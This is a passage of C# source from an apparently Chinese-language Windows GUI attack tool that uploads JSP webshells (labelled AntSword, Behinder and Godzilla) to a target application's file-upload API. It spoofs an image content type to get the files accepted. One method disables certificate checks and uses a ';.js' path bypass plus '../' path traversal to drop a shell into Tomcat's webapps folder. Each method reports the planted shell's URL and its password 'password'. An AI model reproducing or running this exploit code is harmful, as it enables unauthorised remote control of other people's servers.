                    request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0";
                    request.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8";


                    string formDataFooter = "\r\n-----------------------------8db86cc218de63f--";
                    byte[] fileBytes = File.ReadAllBytes(filePath);
                    string formDataTemplate = "-----------------------------8db86cc218de63f\r\n" +
                                      "Content-Disposition: form-data; name=\"fileUploader\"; filename=\"a8d8535787929df71.jsp\"\r\n" +
                                      "Content-Type: image/jpeg\r\n\r\n";
                    long formDataLength = formDataTemplate.Length + fileBytes.Length + formDataFooter.Length;
                    request.ContentLength = formDataLength;
                    Stream requestStream = request.GetRequestStream();
                    byte[] formHeadBytes = System.Text.Encoding.UTF8.GetBytes(formDataTemplate);
                    requestStream.Write(formHeadBytes, 0, formHeadBytes.Length);
                    requestStream.Write(fileBytes, 0, fileBytes.Length);
                    byte[] formFooterBytes = System.Text.Encoding.UTF8.GetBytes(formDataFooter);
                    requestStream.Write(formFooterBytes, 0, formFooterBytes.Length);
                    requestStream.Close();
                    HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                    Stream responseStream = response.GetResponseStream();
                    StreamReader reader = new StreamReader(responseStream);
                    string ssss = reader.ReadToEnd();
                    JsonDocument doc = JsonDocument.Parse(ssss);
                    JObject jobj = JObject.Parse(ssss);
                    String res = doc.RootElement.GetProperty("data").GetProperty("resourceUuid").GetString();
                    textBox2.Text = res;
                    richTextBox7.Text = jobj["message"].ToString();
                    if (richTextBox7.Text == "上传附件成功")
                    {

                        richTextBox3.AppendText("蚁剑上传成功" + "url:" + "/eps/upload" + "/" + textBox2.Text + ".jsp" + "密码:password");
                    }
                    else if (richTextBox7.Text == "上传附件失败:null")

                        richTextBox3.AppendText("蚁剑上传失败" + "url:" + "/eps/upload" + "/" + filePath);


                }
            }
            catch (Exception ex)
            {

                richTextBox3.AppendText("\n" + "蚁剑上传失败");


            }

        }

        public void getshell1()
        {

            try
            {
                if (textBox1.Text == "")
                {

                    MessageBox.Show("请输入地址!!!");
                }


                if (textBox9.Text == "")
                {

                    MessageBox.Show("请输入token!!!");
                }
                else
                {








                    string filePath = "b0b01a0abbce80376.jsp";
                    string uploadUrl = textBox1.Text + "/eps/api/resourceOperations/upload?token=" + textBox9.Text; // 替换为接口的URL
                    HttpWebRequest request = (HttpWebRequest)WebRequest.Create(uploadUrl);
                    request.Method = "POST";
                    request.ContentType = "multipart/form-data; boundary=---------------------------8db86cc218de63f";
                    request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0";
                    request.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8";


                    string formDataFooter = "\r\n-----------------------------8db86cc218de63f--";
                    byte[] fileBytes = File.ReadAllBytes(filePath);
                    string formDataTemplate = "-----------------------------8db86cc218de63f\r\n" +
                                      "Content-Disposition: form-data; name=\"fileUploader\"; filename=\"b0b01a0abbce80376.jsp\"\r\n" +
                                      "Content-Type: image/jpeg\r\n\r\n";
                    long formDataLength = formDataTemplate.Length + fileBytes.Length + formDataFooter.Length;
                    request.ContentLength = formDataLength;
                    Stream requestStream = request.GetRequestStream();
                    byte[] formHeadBytes = System.Text.Encoding.UTF8.GetBytes(formDataTemplate);
                    requestStream.Write(formHeadBytes, 0, formHeadBytes.Length);
                    requestStream.Write(fileBytes, 0, fileBytes.Length);
                    byte[] formFooterBytes = System.Text.Encoding.UTF8.GetBytes(formDataFooter);
                    requestStream.Write(formFooterBytes, 0, formFooterBytes.Length);
                    requestStream.Close();
                    HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                    Stream responseStream = response.GetResponseStream();
                    StreamReader reader = new StreamReader(responseStream);
                    string ssss = reader.ReadToEnd();
                    JsonDocument doc = JsonDocument.Parse(ssss);
                    JObject jobj = JObject.Parse(ssss);
                    String res = doc.RootElement.GetProperty("data").GetProperty("resourceUuid").GetString();
                    textBox2.Text = res;
                    richTextBox7.Text = jobj["message"].ToString();
                    if (richTextBox7.Text == "上传附件成功")
                    {

                        richTextBox3.AppendText("冰蝎上传成功" + "url:" + "/eps/upload" + "/" + textBox2.Text + ".jsp" + "密码:password");
                    }
                    else if (richTextBox7.Text == "上传附件失败:null")

                        richTextBox3.AppendText("冰蝎上传失败" + "url:" + "/eps/upload" + "/" + filePath);


                }
            }
            catch (Exception ex)
            {

                richTextBox3.AppendText("\n" + "冰蝎上传失败");


            }
        }

        public void getshell()
        {






            try
            {
                if (textBox1.Text == "")
                {

                    MessageBox.Show("请输入地址!!!");
                }

                if (textBox9.Text == "")
                {

                    MessageBox.Show("请输入token!!!");
                }
                else
                {







                    string filePath = "g04a575542e19aa9b.jsp";
                    string uploadUrl = textBox1.Text + "/eps/api/resourceOperations/upload?token=" + textBox9.Text; // 替换为接口的URL
                    HttpWebRequest request = (HttpWebRequest)WebRequest.Create(uploadUrl);
                    request.Method = "POST";
                    request.ContentType = "multipart/form-data; boundary=---------------------------8db86cc218de63f";
                    request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0";
                    request.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8";


                    string formDataFooter = "\r\n-----------------------------8db86cc218de63f--";
                    byte[] fileBytes = File.ReadAllBytes(filePath);
                    string formDataTemplate = "-----------------------------8db86cc218de63f\r\n" +
                                      "Content-Disposition: form-data; name=\"fileUploader\"; filename=\"g04a575542e19aa9b.jsp\"\r\n" +
                                      "Content-Type: image/jpeg\r\n\r\n";
                    long formDataLength = formDataTemplate.Length + fileBytes.Length + formDataFooter.Length;
                    request.ContentLength = formDataLength;
                    Stream requestStream = request.GetRequestStream();
                    byte[] formHeadBytes = System.Text.Encoding.UTF8.GetBytes(formDataTemplate);
                    requestStream.Write(formHeadBytes, 0, formHeadBytes.Length);
                    requestStream.Write(fileBytes, 0, fileBytes.Length);
                    byte[] formFooterBytes = System.Text.Encoding.UTF8.GetBytes(formDataFooter);
                    requestStream.Write(formFooterBytes, 0, formFooterBytes.Length);
                    requestStream.Close();
                    HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                    Stream responseStream = response.GetResponseStream();
                    StreamReader reader = new StreamReader(responseStream);
                    string ssss = reader.ReadToEnd();
                    JsonDocument doc = JsonDocument.Parse(ssss);
                    JObject jobj = JObject.Parse(ssss);
                    String res = doc.RootElement.GetProperty("data").GetProperty("resourceUuid").GetString();
                    textBox2.Text = res;
                    richTextBox7.Text = jobj["message"].ToString();
                    if (richTextBox7.Text == "上传附件成功")
                    {

                        richTextBox3.AppendText("哥斯拉上传成功" + "url:" + "/eps/upload" + "/" + textBox2.Text + ".jsp" + "密码:password");
                    }
                    else if (richTextBox7.Text == "上传附件失败:null")

                        richTextBox3.AppendText("哥斯拉上传失败" + "url:" + "/eps/upload" + "/" + filePath);


                }
            }
            catch (Exception ex)
            {

                richTextBox3.AppendText("\n" + "哥斯拉上传失败");


            }

        }
        private void button6_Click(object sender, EventArgs e)
        {


        }

        private void tabPage4_Click(object sender, EventArgs e)
        {

        }

        public void iense()
        {


            try
            {



                ServicePointManager.ServerCertificateValidationCallback += RemoteCertificateValidate;
                string filePath = "g04a575542e19aa9b.jsp";
                string uploadUrl = textBox1.Text + "/center/api/files;.js";
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(uploadUrl);
                request.Method = "POST";
                request.ContentType = "multipart/form-data; boundary=---------------------------8db86cc218de63f";
                request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0";
                request.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8";


                string formDataFooter = "\r\n-----------------------------8db86cc218de63f--";
                byte[] fileBytes = File.ReadAllBytes(filePath);
                string formDataTemplate = "-----------------------------8db86cc218de63f\r\n" +
                                  "Content-Disposition: form-data; name=\"file\"; filename=\"../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/g04a575542e19aa9b.jsp\"\r\n" +
                                  "Content-Type: application/octet-stream\r\n\r\n";
                long formDataLength = formDataTemplate.Length + fileBytes.Length + formDataFooter.Length;
                request.ContentLength = formDataLength;
                Stream requestStream = request.GetRequestStream();
                byte[] formHeadBytes = System.Text.Encoding.UTF8.GetBytes(formDataTemplate);
                requestStream.Write(formHeadBytes, 0, formHeadBytes.Length);
                requestStream.Write(fileBytes, 0, fileBytes.Length);
                byte[] formFooterBytes = System.Text.Encoding.UTF8.GetBytes(formDataFooter);
                requestStream.Write(formFooterBytes, 0, formFooterBytes.Length);
                requestStream.Close();
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                Stream responseStream = response.GetResponseStream();
                StreamReader reader = new StreamReader(responseStream);
                string ssss = reader.ReadToEnd();
                JsonDocument doc = JsonDocument.Parse(ssss);

                String res = doc.RootElement.GetProperty("data").GetProperty("filename").GetString();
                String res1 = doc.RootElement.GetProperty("data").GetProperty("link").GetString();
                if (response.StatusCode == HttpStatusCode.OK)
                {
                    richTextBox3.AppendText("哥斯拉上传成功" + textBox1.Text + "/clusterMgr/g04a575542e19aa9b.jsp" +";.js"+ "密码:password" + "\r\n");
                    richTextBox3.AppendText(res1 + "\r\n");
                }
                else
                {

                    richTextBox3.AppendText("哥斯拉文件上传失败" + "\r\n");
                }

            }
            catch (Exception ex)
            {
                richTextBox3.AppendText("哥斯拉文件上传失败" + "\r\n");

            }
        }
        private void button6_Click_1(object sender, EventArgs e)
        {
            if (comboBox2.SelectedIndex == -1)
            {
                MessageBox.Show("请选择内置模块");

            }

            if (comboBox2.SelectedIndex >= 0)
            {

                int s = comboBox2.SelectedIndex;
                if (s == 0)
                {
                    getshell();



                }
                if (s == 1)
                {
                    getshell1();



                }
                if (s == 2)
                {
                    getshell2();

                }
                if (s == 3)
                {
                    getshell3();


                }



            }
        }

        private void button12_Click(object sender, EventArgs e)
        {

        }

        private void button12_Click_1(object sender, EventArgs e)
        {

            if (comboBox2.SelectedIndex == -1)
            {
                MessageBox.Show("请选择内置模块");

            }

            if (comboBox2.SelectedIndex >= 0)
            {

                int s1 = comboBox2.SelectedIndex;
                if (s1 == 1)
                {
                    iense();
                }
                if (s1 == 2)
                {
                    richTextBox3.AppendText("待开发");
                }
                if (s1 == 3)
                {
                    richTextBox3.AppendText("待开发");
                }
                if (s1 == 4)
                {
                    richTextBox3.AppendText("待开发");
                }




            }

        }

        private void button13_Click(object sender, EventArgs e)
        {
            MessageBox.Show("待开发");
        }
    }



}









